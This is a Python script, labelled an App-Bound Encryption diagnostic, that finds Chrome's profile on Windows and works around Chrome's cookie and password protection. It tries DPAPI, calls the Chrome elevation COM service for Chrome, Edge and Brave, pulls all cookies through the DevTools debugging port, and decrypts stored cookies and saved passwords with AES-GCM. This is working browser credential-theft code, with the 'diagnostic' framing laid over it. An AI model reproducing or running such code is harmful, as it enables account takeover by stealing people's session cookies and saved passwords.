#!/usr/bin/env python3
"""
ABE (App-Bound Encryption) Diagnostic Script for Chrome 127+
Run this on Windows with Chrome 144 to test cookie/password decryption.

Usage:
    python abe_diagnostic.py

Requirements:
    pip install cryptography pywin32 comtypes websocket-client
"""

import base64
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Optional, Any, Dict, List, Tuple

# Colors for output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def ok(msg): print(f"{Colors.GREEN}✓{Colors.RESET} {msg}")
def fail(msg): print(f"{Colors.RED}✗{Colors.RESET} {msg}")
def warn(msg): print(f"{Colors.YELLOW}⚠{Colors.RESET} {msg}")
def info(msg): print(f"{Colors.BLUE}ℹ{Colors.RESET} {msg}")
def header(msg): print(f"\n{Colors.BOLD}{'='*60}\n{msg}\n{'='*60}{Colors.RESET}")

# ============================================================
# CONFIGURATION
# ============================================================

def get_chrome_paths() -> Dict[str, Path]:
    """Get Chrome-related paths."""
    local_app_data = os.environ.get("LOCALAPPDATA", "")
    user_data = Path(local_app_data) / "Google" / "Chrome" / "User Data"
    
    return {
        "user_data": user_data,
        "local_state": user_data / "Local State",
        "cookies": user_data / "Default" / "Network" / "Cookies",
        "login_data": user_data / "Default" / "Login Data",
    }

def get_chrome_exe() -> Optional[Path]:
    """Find Chrome executable."""
    possible = [
        Path(os.environ.get("PROGRAMFILES", "")) / "Google" / "Chrome" / "Application" / "chrome.exe",
        Path(os.environ.get("PROGRAMFILES(X86)", "")) / "Google" / "Chrome" / "Application" / "chrome.exe",
        Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "Application" / "chrome.exe",
    ]
    for p in possible:
        if p.exists():
            return p
    return None

# ============================================================
# STEP 1: System Check
# ============================================================

def check_system() -> bool:
    """Check system requirements."""
    header("STEP 1: System Check")
    
    all_ok = True
    
    # Windows check
    if os.name == "nt":
        ok("Running on Windows")
    else:
        fail(f"Not Windows (os.name={os.name})")
        return False
    
    # Python version
    info(f"Python version: {sys.version}")
    
    # Required modules
    modules = {
        "cryptography": "pip install cryptography",
        "win32crypt": "pip install pywin32",
        "comtypes": "pip install comtypes",
        "websocket": "pip install websocket-client",
    }
    
    for mod, install in modules.items():
        try:
            __import__(mod)
            ok(f"Module '{mod}' available")
        except ImportError:
            fail(f"Module '{mod}' missing - {install}")
            all_ok = False
    
    return all_ok

# ============================================================
# STEP 2: Chrome Detection
# ============================================================

def check_chrome() -> Tuple[bool, Optional[str]]:
    """Check Chrome installation and version."""
    header("STEP 2: Chrome Detection")
    
    paths = get_chrome_paths()
    chrome_exe = get_chrome_exe()
    
    # Chrome executable
    if chrome_exe:
        ok(f"Chrome found: {chrome_exe}")
    else:
        fail("Chrome executable not found")
        return False, None
    
    # Get version
    version = None
    try:
        result = subprocess.run(
            [str(chrome_exe), "--version"],
            capture_output=True, text=True, timeout=10
        )
        version = result.stdout.strip().replace("Google Chrome ", "")
        ok(f"Chrome version: {version}")
        
        major = int(version.split(".")[0])
        if major >= 127:
            warn(f"Chrome {major} uses App-Bound Encryption (ABE)")
        else:
            ok(f"Chrome {major} uses standard DPAPI encryption")
    except Exception as e:
        warn(f"Could not get Chrome version: {e}")
    
    # Local State
    if paths["local_state"].exists():
        ok(f"Local State found: {paths['local_state']}")
    else:
        fail("Local State not found")
        return False, version
    
    # Cookies DB
    if paths["cookies"].exists():
        ok(f"Cookies DB found: {paths['cookies']}")
    else:
        warn(f"Cookies DB not found at default path")
    
    # Login Data
    if paths["login_data"].exists():
        ok(f"Login Data found: {paths['login_data']}")
    else:
        warn("Login Data not found")
    
    return True, version

# ============================================================
# STEP 3: Key Analysis
# ============================================================

def analyze_key() -> Tuple[bool, Optional[bytes], bool]:
    """Analyze encryption key from Local State."""
    header("STEP 3: Key Analysis")
    
    paths = get_chrome_paths()
    local_state = paths["local_state"]
    
    if not local_state.exists():
        fail("Local State not found")
        return False, None, False
    
    try:
        data = json.loads(local_state.read_text(encoding="utf-8"))
        encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
        
        if not encrypted_key_b64:
            fail("No encrypted_key in Local State")
            return False, None, False
        
        encrypted_key = base64.b64decode(encrypted_key_b64)
        ok(f"Encrypted key loaded ({len(encrypted_key)} bytes)")
        
        # Check key type
        is_abe = encrypted_key.startswith(b"APPB")
        is_dpapi = encrypted_key.startswith(b"DPAPI")
        
        info(f"Key prefix: {encrypted_key[:5]}")
        info(f"Key hex (first 50 bytes): {encrypted_key[:50].hex()}")
        
        if is_abe:
            warn("Key uses ABE encryption (APPB prefix)")
            return True, encrypted_key, True
        elif is_dpapi:
            ok("Key uses standard DPAPI encryption")
            return True, encrypted_key[5:], False  # Remove DPAPI prefix
        else:
            warn(f"Unknown key format: {encrypted_key[:10]}")
            return True, encrypted_key, False
            
    except Exception as e:
        fail(f"Failed to read Local State: {e}")
        return False, None, False

# ============================================================
# STEP 4: Decryption Methods
# ============================================================

def try_dpapi_decrypt(encrypted_key: bytes, is_abe: bool) -> Optional[bytes]:
    """Try DPAPI decryption."""
    print("\n  Testing DPAPI decryption...")
    
    try:
        import win32crypt
    except ImportError:
        fail("  win32crypt not available")
        return None
    
    key_data = encrypted_key[4:] if is_abe else encrypted_key
    
    methods = [
        ("Direct DPAPI", lambda: win32crypt.CryptUnprotectData(key_data, None, None, None, 0)[1]),
        ("DPAPI UI_FORBIDDEN", lambda: win32crypt.CryptUnprotectData(key_data, None, None, None, 0x01)[1]),
        ("DPAPI LOCAL_MACHINE", lambda: win32crypt.CryptUnprotectData(key_data, None, None, None, 0x04)[1]),
        ("Full key DPAPI", lambda: win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]),
    ]
    
    for name, method in methods:
        try:
            result = method()
            if result and len(result) >= 16:
                ok(f"  {name}: SUCCESS ({len(result)} bytes)")
                info(f"    Key hex: {result.hex()}")
                if len(result) == 32:
                    ok(f"    Valid AES-256 key (32 bytes)")
                    return result
                else:
                    warn(f"    Unexpected key length: {len(result)} (expected 32)")
        except Exception as e:
            fail(f"  {name}: {e}")
    
    return None

def try_ielevator_decrypt(encrypted_key: bytes) -> Optional[bytes]:
    """Try IElevator COM decryption."""
    print("\n  Testing IElevator COM decryption...")
    
    try:
        import comtypes.client
        from comtypes import GUID, COMMETHOD, HRESULT, IUnknown
        from ctypes import POINTER, c_char_p, c_ulong, byref
    except ImportError:
        fail("  comtypes not available")
        return None
    
    # IElevator interface definition
    class IElevator(IUnknown):
        _iid_ = GUID("{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}")
        _methods_ = [
            COMMETHOD([], HRESULT, 'RunRecoveryCRXElevated',
                      (['in'], c_char_p, 'crx_path'),
                      (['in'], c_char_p, 'browser_appid'),
                      (['in'], c_char_p, 'browser_version'),
                      (['in'], c_char_p, 'session_id'),
                      (['in'], c_ulong, 'caller_proc_id'),
                      (['out'], POINTER(c_ulong), 'proc_handle')),
            COMMETHOD([], HRESULT, 'EncryptData',
                      (['in'], c_ulong, 'protection_level'),
                      (['in'], c_char_p, 'plaintext'),
                      (['in'], c_ulong, 'plaintext_len'),
                      (['out'], POINTER(c_char_p), 'ciphertext'),
                      (['out'], POINTER(c_ulong), 'ciphertext_len')),
            COMMETHOD([], HRESULT, 'DecryptData',
                      (['in'], c_char_p, 'ciphertext'),
                      (['in'], c_ulong, 'ciphertext_len'),
                      (['out'], POINTER(c_char_p), 'plaintext'),
                      (['out'], POINTER(c_ulong), 'plaintext_len')),
        ]
    
    clsids = {
        "Chrome Stable": "{708860E0-F641-4611-8895-7D867DD3675B}",
        "Chrome Beta": "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}",
        "Chrome Dev": "{DA7FDCA5-2CAA-4637-AA17-0749F64F49D2}",
        "Chrome Canary": "{3A84F9C2-6164-485C-A7D9-4B27F8AC3D58}",
        "Edge": "{1EBBCAB8-D9A8-4FBA-8BC2-7B7687B31B52}",
        "Brave": "{576B31AF-6369-4B6B-8560-E4B203A97A8B}",
    }
    
    for name, clsid_str in clsids.items():
        try:
            comtypes.client.CoInitialize()
            try:
                clsid = GUID(clsid_str)
                elevator = comtypes.client.CreateObject(clsid, interface=IElevator)
                
                plaintext = c_char_p()
                plaintext_len = c_ulong()
                
                hr = elevator.DecryptData(
                    encrypted_key,
                    len(encrypted_key),
                    byref(plaintext),
                    byref(plaintext_len)
                )
                
                if hr == 0 and plaintext.value:
                    result = plaintext.value[:plaintext_len.value]
                    ok(f"  {name} IElevator: SUCCESS ({len(result)} bytes)")
                    info(f"    Key hex: {result.hex()}")
                    if len(result) == 32:
                        ok(f"    Valid AES-256 key (32 bytes)")
                        return result
                    else:
                        warn(f"    Unexpected length: {len(result)}")
                else:
                    fail(f"  {name} IElevator: HRESULT={hr}")
                    
            except Exception as e:
                fail(f"  {name} IElevator: {e}")
            finally:
                try:
                    comtypes.client.CoUninitialize()
                except:
                    pass
        except Exception as e:
            fail(f"  {name} CLSID error: {e}")
    
    return None

def try_cdp_cookies() -> Tuple[bool, List[Dict]]:
    """Try to get cookies via Chrome DevTools Protocol."""
    print("\n  Testing CDP cookie extraction...")
    
    try:
        import websocket
        import urllib.request
    except ImportError:
        fail("  websocket-client not available")
        return False, []
    
    # Check if Chrome is running with debug port
    try:
        response = urllib.request.urlopen("http://127.0.0.1:9222/json", timeout=2)
        targets = json.loads(response.read())
        
        if not targets:
            warn("  No CDP targets (Chrome may not be running with --remote-debugging-port=9222)")
            return False, []
        
        ws_url = targets[0].get("webSocketDebuggerUrl")
        if not ws_url:
            fail("  No WebSocket URL in CDP response")
            return False, []
        
        info(f"  CDP target: {targets[0].get('title', 'unknown')}")
        
        # Connect and get cookies
        ws = websocket.create_connection(ws_url, timeout=5)
        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        response = json.loads(ws.recv())
        ws.close()
        
        if "result" in response and "cookies" in response["result"]:
            cookies = response["result"]["cookies"]
            ok(f"  CDP extraction: SUCCESS ({len(cookies)} cookies)")
            return True, cookies
        else:
            fail(f"  CDP response error: {response}")
            return False, []
            
    except urllib.error.URLError:
        warn("  CDP not available (start Chrome with: --remote-debugging-port=9222)")
        return False, []
    except Exception as e:
        fail(f"  CDP error: {e}")
        return False, []

def test_decryption_methods(encrypted_key: bytes, is_abe: bool) -> Optional[bytes]:
    """Test all decryption methods."""
    header("STEP 4: Decryption Methods")
    
    # Method 1: CDP (best for Chrome 127+)
    cdp_ok, cdp_cookies = try_cdp_cookies()
    if cdp_ok:
        info(f"  CDP provides already-decrypted cookies!")
        # Show sample cookies
        for cookie in cdp_cookies[:3]:
            info(f"    {cookie.get('domain')}: {cookie.get('name')}={cookie.get('value', '')[:30]}...")
    
    # Method 2: IElevator (for ABE keys)
    if is_abe:
        key = try_ielevator_decrypt(encrypted_key)
        if key:
            return key
    
    # Method 3: DPAPI
    key = try_dpapi_decrypt(encrypted_key, is_abe)
    if key:
        return key
    
    if cdp_ok:
        warn("\n  Key decryption failed, but CDP is available!")
        warn("  Use CDP method to extract cookies.")
        return None
    
    fail("\n  All decryption methods failed!")
    return None

# ============================================================
# STEP 5: Cookie Decryption Test
# ============================================================

def copy_db(db_path: Path) -> Optional[Path]:
    """Copy database to temp file."""
    try:
        handle = tempfile.NamedTemporaryFile(prefix="abe_test_", suffix=".db", delete=False)
        temp_path = Path(handle.name)
        handle.close()
        shutil.copyfile(db_path, temp_path)
        return temp_path
    except Exception as e:
        fail(f"  Failed to copy DB: {e}")
        return None

def test_cookie_decryption(decryption_key: Optional[bytes]) -> bool:
    """Test actual cookie decryption."""
    header("STEP 5: Cookie Decryption Test")
    
    paths = get_chrome_paths()
    cookies_db = paths["cookies"]
    
    if not cookies_db.exists():
        fail(f"Cookies DB not found: {cookies_db}")
        return False
    
    temp_db = copy_db(cookies_db)
    if not temp_db:
        return False
    
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Get cookie stats
        cursor.execute("SELECT COUNT(*) FROM cookies")
        total = cursor.fetchone()[0]
        info(f"Total cookies: {total}")
        
        # Count by encryption type
        cursor.execute("SELECT encrypted_value FROM cookies LIMIT 100")
        
        v10_count = 0
        v20_count = 0
        other_count = 0
        
        for (ev,) in cursor:
            if ev:
                ev_bytes = bytes(ev)
                if ev_bytes.startswith(b"v10") or ev_bytes.startswith(b"v11") or ev_bytes.startswith(b"v12"):
                    v10_count += 1
                elif ev_bytes.startswith(b"v20"):
                    v20_count += 1
                else:
                    other_count += 1
        
        info(f"v10/v11/v12 cookies: {v10_count}")
        info(f"v20 cookies (ABE): {v20_count}")
        info(f"Other: {other_count}")
        
        if v20_count > 0:
            warn(f"Found {v20_count} ABE-encrypted (v20) cookies")
        
        # Try to decrypt some cookies
        if decryption_key:
            print("\n  Testing AES-GCM decryption...")
            
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            except ImportError:
                fail("  cryptography module not available")
                return False
            
            cursor.execute("""
                SELECT host_key, name, encrypted_value 
                FROM cookies 
                WHERE encrypted_value IS NOT NULL 
                LIMIT 20
            """)
            
            decrypted = 0
            failed = 0
            
            aesgcm = AESGCM(decryption_key)
            
            for host, name, ev in cursor:
                if not ev:
                    continue
                ev_bytes = bytes(ev)
                
                # v10/v11/v12/v20 format: prefix(3) + nonce(12) + ciphertext
                if ev_bytes[:3] in (b"v10", b"v11", b"v12", b"v20"):
                    try:
                        nonce = ev_bytes[3:15]
                        ciphertext = ev_bytes[15:]
                        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
                        value = plaintext.decode("utf-8", errors="replace")
                        decrypted += 1
                        if decrypted <= 3:
                            ok(f"    {host}: {name} = {value[:50]}...")
                    except Exception as e:
                        failed += 1
                        if failed <= 3:
                            fail(f"    {host}: {name} - {e}")
            
            print()
            if decrypted > 0:
                ok(f"Successfully decrypted: {decrypted} cookies")
            if failed > 0:
                fail(f"Failed to decrypt: {failed} cookies")
            
            return decrypted > 0
        else:
            warn("No decryption key available - cannot test AES-GCM")
            return False
            
    except Exception as e:
        fail(f"Database error: {e}")
        return False
    finally:
        conn.close()
        try:
            temp_db.unlink()
        except:
            pass

# ============================================================
# STEP 6: Password Decryption Test
# ============================================================

def test_password_decryption(decryption_key: Optional[bytes]) -> bool:
    """Test password decryption."""
    header("STEP 6: Password Decryption Test")
    
    paths = get_chrome_paths()
    login_data = paths["login_data"]
    
    if not login_data.exists():
        warn(f"Login Data not found: {login_data}")
        return False
    
    temp_db = copy_db(login_data)
    if not temp_db:
        return False
    
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM logins WHERE blacklisted_by_user = 0")
        total = cursor.fetchone()[0]
        info(f"Total saved passwords: {total}")
        
        if total == 0:
            warn("No saved passwords to test")
            return True
        
        if decryption_key:
            print("\n  Testing password decryption...")
            
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            except ImportError:
                fail("  cryptography not available")
                return False
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value 
                FROM logins 
                WHERE blacklisted_by_user = 0 
                LIMIT 10
            """)
            
            decrypted = 0
            failed = 0
            aesgcm = AESGCM(decryption_key)
            
            for url, username, pwd in cursor:
                if not pwd:
                    continue
                pwd_bytes = bytes(pwd)
                
                if pwd_bytes[:3] in (b"v10", b"v11", b"v12", b"v20"):
                    try:
                        nonce = pwd_bytes[3:15]
                        ciphertext = pwd_bytes[15:]
                        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
                        password = plaintext.decode("utf-8", errors="replace")
                        decrypted += 1
                        if decrypted <= 3:
                            # Mask password for security
                            masked = password[:2] + "*" * (len(password) - 2) if len(password) > 2 else "***"
                            ok(f"    {url[:40]}: {username} = {masked}")
                    except Exception as e:
                        failed += 1
                        if failed <= 3:
                            fail(f"    {url[:40]}: {e}")
            
            print()
            if decrypted > 0:
                ok(f"Successfully decrypted: {decrypted} passwords")
            if failed > 0:
                fail(f"Failed to decrypt: {failed} passwords")
            
            return decrypted > 0
        else:
            warn("No decryption key available")
            return False
            
    except Exception as e:
        fail(f"Database error: {e}")
        return False
    finally:
        conn.close()
        try:
            temp_db.unlink()
        except:
            pass

# ============================================================
# MAIN
# ============================================================

def main():
    print(f"\n{Colors.BOLD}ABE Diagnostic Tool for Chrome 127+{Colors.RESET}")
    print("=" * 60)
    
    # Step 1: System check
    if not check_system():
        fail("\nSystem requirements not met. Install missing modules.")
        return 1
    
    # Step 2: Chrome detection
    chrome_ok, version = check_chrome()
    if not chrome_ok:
        fail("\nChrome not properly installed.")
        return 1
    
    # Step 3: Key analysis
    key_ok, encrypted_key, is_abe = analyze_key()
    if not key_ok or encrypted_key is None:
        fail("\nFailed to load encryption key.")
        return 1
    
    # Step 4: Try decryption methods
    decryption_key = test_decryption_methods(encrypted_key, is_abe)
    
    # Step 5: Test cookie decryption
    cookies_ok = test_cookie_decryption(decryption_key)
    
    # Step 6: Test password decryption  
    passwords_ok = test_password_decryption(decryption_key)
    
    # Summary
    header("SUMMARY")
    print(f"Chrome version: {version}")
    print(f"ABE encryption: {'Yes' if is_abe else 'No'}")
    print(f"Key decrypted:  {'Yes' if decryption_key else 'No'}")
    print(f"Cookies OK:     {'Yes' if cookies_ok else 'No'}")
    print(f"Passwords OK:   {'Yes' if passwords_ok else 'No'}")
    
    if not decryption_key and is_abe:
        header("RECOMMENDATIONS")
        print("""
For Chrome 127+ with ABE, try these solutions:

1. USE CDP METHOD (recommended):
   - Close Chrome completely
   - Start Chrome with: chrome.exe --remote-debugging-port=9222
   - Run this script again
   - CDP provides already-decrypted cookies

2. RUN AS ADMINISTRATOR:
   - Right-click script -> Run as Administrator
   - IElevator COM may require elevated privileges

3. CHECK CHROME ELEVATION SERVICE:
   - Open Services (services.msc)
   - Find "Google Chrome Elevation Service"
   - Ensure it's running

4. SAME USER CONTEXT:
   - Run script as the same user who uses Chrome
   - DPAPI keys are user-specific
""")
    
    return 0 if (cookies_ok or passwords_ok or decryption_key) else 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(1)
    except Exception as e:
        fail(f"\nUnexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
